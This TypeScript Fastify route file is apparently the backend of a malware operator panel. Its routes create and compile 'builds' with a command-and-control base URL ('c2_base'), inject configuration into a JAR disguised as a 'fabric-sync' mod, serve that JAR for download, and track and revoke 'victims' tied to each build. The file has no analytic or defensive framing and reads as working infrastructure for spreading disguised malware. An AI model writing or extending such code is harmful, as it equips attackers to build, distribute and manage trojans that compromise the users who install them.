import type { FastifyPluginAsync } from 'fastify';
import { z } from 'zod';
import { createReadStream } from 'node:fs';
import { access, mkdir, stat } from 'node:fs/promises';
import { join } from 'node:path';
import { prisma } from '../lib/db';
import { env } from '../lib/env';
import { audit } from '../lib/audit';
import { bad, notFound } from '../lib/errors';
import { requireRole } from '../plugins/auth';
import { buildToken } from '../lib/crypto';
import { createBuild, injectConfig, type BuildConfig } from '../services/build';

const createSchema = z.object({
  name: z.string().min(2).max(64),
  version: z.string().regex(/^\d+\.\d+\.\d+$/),
  profile: z.enum(['lite', 'full']).default('full'),
  c2_base: z.string().url().optional()
});

export const buildRoutes: FastifyPluginAsync = async (app) => {
  app.get('/builds', async () => {
    const items = await prisma.build.findMany({
      orderBy: { createdAt: 'desc' },
      include: { createdBy: { select: { email: true } }, _count: { select: { victims: true } } }
    });
    return {
      items: items.map((build) => ({
        id: build.id,
        name: build.name,
        version: build.version,
        profile: build.profile,
        universal: build.universal,
        buildId: build.buildId,
        token: buildToken(build.secret),
        status: build.status,
        jarPath: build.jarPath,
        createdBy: build.createdBy?.email ?? null,
        victims: build._count.victims,
        createdAt: build.createdAt,
        revokedAt: build.revokedAt
      }))
    };
  });

  app.post('/builds', { preHandler: requireRole('admin') }, async (request, reply) => {
    const input = createSchema.parse(request.body);
    const created = await createBuild({ ...input, operatorId: request.operator!.id });
    await audit(prisma, { operatorId: request.operator?.id, action: 'build.create', entity: 'build', entityId: created.id, ip: request.clientIp, data: { name: input.name, version: input.version, profile: input.profile } });
    return reply.code(201).send({ id: created.id, buildId: created.buildId, token: created.token, config: created.config });
  });

  app.post('/builds/:id/compile', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const build = await prisma.build.findUnique({ where: { id } });
    if (!build) throw notFound('build');
    if (build.status === 'revoked') throw bad('revoked', 'build revoked');
    try {
      await access(env.JAR_SOURCE);
    } catch {
      throw bad('jar_missing', `JAR_SOURCE not found: ${env.JAR_SOURCE}`, 503);
    }
    const dir = join(env.BUILD_DIR, build.id);
    await mkdir(dir, { recursive: true });
    const target = join(dir, `fabric-sync-${build.version}-${build.id.slice(0, 8)}.jar`);
    await injectConfig(env.JAR_SOURCE, build.config as unknown as BuildConfig, target);
    let bytes = 0;
    try {
      bytes = (await stat(target)).size;
    } catch {
      throw bad('compile_failed', 'jar not produced', 500);
    }
    await prisma.build.update({ where: { id }, data: { jarPath: target, status: 'ready' } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'build.compile', entity: 'build', entityId: id, ip: request.clientIp, data: { target, bytes } });
    return { ok: true, bytes, path: target };
  });

  app.get('/builds/:id/download', async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const build = await prisma.build.findUnique({ where: { id } });
    if (!build?.jarPath) throw notFound('jar');
    const name = `fabric-sync-${build.version}.jar`;
    reply.header('content-type', 'application/java-archive');
    reply.header('content-disposition', `attachment; filename="${name}"`);
    return reply.send(createReadStream(build.jarPath));
  });

  app.post('/builds/:id/revoke', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    await prisma.build.update({ where: { id }, data: { status: 'revoked', revokedAt: new Date() } });
    await prisma.victim.updateMany({ where: { buildId: id }, data: { status: 'revoked', revokedAt: new Date() } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'build.revoke', entity: 'build', entityId: id, ip: request.clientIp });
    return { ok: true };
  });

  app.delete('/builds/:id', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const count = await prisma.victim.count({ where: { buildId: id } });
    if (count > 0) throw bad('in_use', `${count} victims still reference this build`);
    await prisma.build.delete({ where: { id } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'build.delete', entity: 'build', entityId: id, ip: request.clientIp });
    return { ok: true };
  });
};
